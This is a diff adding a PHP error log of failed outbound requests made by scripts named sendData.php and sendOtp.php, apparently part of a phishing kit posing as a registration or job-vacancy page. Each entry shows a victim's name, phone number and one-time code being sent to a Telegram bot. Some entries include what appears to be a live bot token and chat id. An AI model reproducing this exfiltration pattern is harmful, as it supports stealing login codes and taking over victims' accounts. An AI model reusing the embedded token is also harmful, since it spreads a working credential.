@@ -1,0 +1,8 @@
+[22-Jul-2025 11:26:32 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/botBotToken/sendMessage?chat_id=123&amp;text=%2AData+Telegram%2A%0ANama+%3A+qwewqewe%0ANomor+%3A+%2B9682353253253253&amp;parse_mode=Markdown): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/gbvsmieo/public_html/register/data/sendData.php on line 22
+[22-Jul-2025 11:26:36 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/botBotToken/sendMessage?chat_id=123&amp;text=Data+Telegram%2A%0ANama+%3A+qwewqewe%0ANomor+%3A+%2B9682353253253253%0AOTP+%3A+31242&amp;parse_mode=Markdown): failed to open stream: HTTP request failed! HTTP/1.1 404 Not Found
+ in /home/gbvsmieo/public_html/register/data/sendOtp.php on line 19
+[22-Jul-2025 11:33:51 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot8114149125:AAES87rYx_d4YDX_Ma8pZzF4JZtf8EjlBRU/sendMessage?chat_id=6994799047&amp;text=Data+Telegram%2A%0ANama+%3A+TRX+Tron%0ANomor+%3A+%2B96213242142424%0AOTP+%3A+12412&amp;parse_mode=Markdown): failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request
+ in /home/gbvsmieo/public_html/Vacancies2025/data/sendOtp.php on line 19
+[22-Jul-2025 12:25:55 UTC] PHP Warning:  file_get_contents(https://api.telegram.org/bot8114149125:AAES87rYx_d4YDX_Ma8pZzF4JZtf8EjlBRU/sendMessage?chat_id=6994799047&amp;text=Data+Telegram%2A%0ANama+%3A+TRX+Tron%0ANomor+%3A+%2B9629620781904812%0AOTP+%3A+12453&amp;parse_mode=Markdown): failed to open stream: HTTP request failed! HTTP/1.1 400 Bad Request
+ in /home/gbvsmieo/public_html/Vacancies2025/data/sendOtp.php on line 19
